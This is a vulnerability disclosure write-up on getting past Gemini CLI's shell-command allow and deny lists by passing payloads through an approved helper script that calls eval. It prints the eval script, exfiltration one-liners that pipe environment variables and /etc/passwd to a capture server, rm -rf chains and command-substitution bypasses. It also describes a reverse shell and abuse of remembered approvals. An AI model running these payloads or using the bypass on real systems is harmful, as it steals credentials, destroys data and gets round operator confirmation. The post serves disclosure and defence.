Unsafe and Bypassing Gemini CLI Command Restrictions via eval Injection

04 Aug, 2026 | Google VRP RCE Gemini CLI

Gemini CLI’s shell tool looked careful: split on && / ; / ||, prefix-match against allow and deny lists, refuse the obvious rm and friends. The bug was not that the matcher was wrong on those strings. The bug was that the matcher only ever saw the outer command — and anything behind eval was invisible.

I reported this to Google VRP against google-gemini/gemini-cli: unsafe execution of a user-supplied string via eval in a helper script (vuln.sh), combined with CLI policy that only validated top-level run_shell_command invocations. The result was unrestricted host command execution — including destructive deletes, environment and file exfiltration, command-substitution bypasses, and reverse shells — without the confirmation or blocklist behavior operators thought they had configured.

The chain in one line: restricted shell tool → approve ./vuln.sh … → eval of the argument → arbitrary commands outside Gemini’s validator.

Scope note

This writeup describes a local agent / CLI chain. Severity comes from silent bypass of configured command restrictions and missing human-in-the-loop on dynamic payloads — not from unauthenticated remote entry. Impact is highest where Gemini CLI runs with tools enabled (default “no sandbox” installs, CI, DevOps workstations).

What Gemini CLI thought it was enforcing

At the time of testing (Gemini CLI v0.1.15 / v0.1.16), run_shell_command could be constrained with configuration of the form: 

{
  "coreTools": ["run_shell_command"],
  "excludeTools": ["run_shell_command(rm)"]
}

Behaviorally, the CLI:

  • Split command chains on operators such as &&, ;, and ||
  • Applied prefix-based matching against tool names / command names (rm, git, …)
  • Remembered previously approved commands (e.g. curl) to reduce repeated prompts

That is a reasonable design if every dangerous token appears in the string Gemini inspects. It is not sufficient if the dangerous work happens one layer down, inside a process Gemini already approved.

The confused deputy: vuln.sh + eval

The vulnerable helper was deliberately simple — the kind of “utility script” an agent is happy to invoke when a repo (or a prior turn) presents it as the intended entrypoint: 

#!/bin/bash
echo "Welcome!"
echo "You entered: $1"
eval "$1"

# Run rm -rf on $2 (second argument)
rm -rf "$2"
echo "Deleted $2"

From Gemini’s point of view, the tool call is ./vuln.sh "<payload>". Prefix policy sees a script invocation, not rm, not curl, not a reverse shell. After approval, the shell runs eval on the first argument. That is classic eval injection: untrusted input becomes code after the policy layer has already said yes.

The mismatch

Security control: validate the top-level command string.
Runtime: execute whatever the approved process does with its arguments.
Attacker: put the real payload in an argument that eval (or equivalent) will run.

Payloads that crossed the perimeter

With a listener capturing HTTP POSTs (local PoC on port 8080), the agent could be steered into invoking the script with payloads that Gemini never treated as the banned commands themselves.

Identity + env + file exfiltration

./vuln.sh "whoami | curl -X POST --data-binary @- http://localhost:8080 ; env | grep -E 'USER|HOME|PATH' | curl -X POST --data-binary @- http://localhost:8080 ; cat /etc/passwd | curl -X POST --data-binary @- http://localhost:8080 ;"

Destructive / mixed chains

./vuln.sh "rm -rf | curl -X POST --data-binary @- http://localhost:8080 ; env | grep -E 'USER|HOME|PATH' | curl -X POST --data-binary @- http://localhost:8080 ; cat /etc/passwd | curl -X POST --data-binary @- http://localhost:8080 ;"

A minimal capture server for the PoC: 

import http.server
import socketserver

PORT = 8080

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        print("\n[+] Received POST data:")
        print(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Captured\n")

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    print(f"[*] Listening on http://localhost:{PORT}")
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        httpd.serve_forever()
Environment

PoCs were run in Gemini CLI’s default “no sandbox” posture (visible in the UI). That is the common install/run path — restrictions were supposed to come from tool policy, not from an OS sandbox.

Approval memory makes it worse

A second failure mode sat next to the eval gap: Gemini CLI remembers previously approved commands to avoid re-prompting. Once curl (or a similar “benign” tool) has been blessed, appending hostile work to a familiar prefix can ride that memory. Combined with a script-shaped outer command, the operator never sees a fresh confirmation for the actual destructive or exfiltrating segment.

Observed in PoC media: file deletion completing without a confirmation step for rm, and sensitive data landing on the capture endpoint while the CLI UI still looked like it had only run a helper script.

Command substitution was also on the wrong side of the fence

Gemini CLI attempted to block direct command substitution forms such as $(…). Passing the same idea through the eval script defeated that check, because the CLI never parsed the argument string as a shell AST — it only executed the outer process: 

./vuln.sh "echo \$(whoami)"
./vuln.sh "echo \$(pwd)"

Stronger payloads mixed substitution with exfiltration and host-side side effects (including launching calc.exe on Windows-facing demos) while still presenting as a single approved script call.

Escalation: reverse shell / RCE without a human brake

Once eval is in the path, the ceiling is full interactive control of the user session. One of the follow-up PoCs used a bash /dev/tcp reverse shell with a Python fallback, still wrapped as an argument to vuln.sh — no additional confirmation for the network listener connect or the spawned TTY.

Separately, a terminal shutdown PoC showed host power-control style commands executing through the same pattern without validation of the inner shutdown action.

What this bug made obvious

Tool allow/deny lists that only tokenize the top-level argv are not a sandbox. They are a UI for the first hop. Any approved interpreter, script, or binary that re-enters a shell (eval, bash -c, sh -c, package scripts, build hooks) reopens the full command surface unless the product enforces a real execution sandbox or inspects / proxies every child command.

Impact model

  • Policy false confidence — operators configure excludeTools believing rm / exfil tools are blocked; agents still run them via helpers.
  • Silent data loss — deletes and destructive chains without the confirmation path that direct rm would have hit.
  • Credential / env leakage — env, identity, and files such as /etc/passwd posted to attacker-controlled endpoints.
  • Full host takeover — reverse shells and arbitrary RCE as the CLI user, including in CI or shared DevOps environments where Gemini CLI is automated.

Attack preconditions are modest: a repo or session that causes the agent to run a script which evaluates untrusted input, plus Gemini CLI with shell tools enabled under the tested restriction model.

The open-source issue outcome reframes part of the original config surface (move from excludeTools toward policy), but the underlying lesson remains: top-level command allowlists are not a substitute for sandboxing or argument-aware policy when the agent can invoke interpreters.

What I’d actually take from this

Validate the execution graph, not only the first argv. Approving ./tool.sh without constraining what that tool can spawn is approving a shell with extra steps.

Treat eval / bash -c / dynamic runners as privileged sinks. If an agent can reach them with user- or model-controlled strings, your exclude list on rm is theater.

Don’t confuse “remembered approval” with continuous consent. Sticky allow for curl plus a novel suffix is how exfiltration hides next to a familiar prefix.

Prefer real isolation. Policy engines and sandboxes beat string prefixes when the product’s default is unsandboxed shell access.

Agent safety is a systems problem. The model does not need to “jailbreak” a blocklist if the blocklist never sees the payload.

If you ship agent CLIs with shell tools

  • Assume any approved binary may re-enter a shell; constrain with OS sandbox / policy engine, not only prefix deny lists.
  • Never ship or document helper scripts that eval untrusted arguments in agent-writable workspaces.
  • Re-prompt (or deny) when command strings change materially — not only when the first token is new.
  • Parse or proxy child commands if you claim to block substitution and destructive builtins.
  • Document clearly when legacy excludeTools no longer applies and what replaces it.
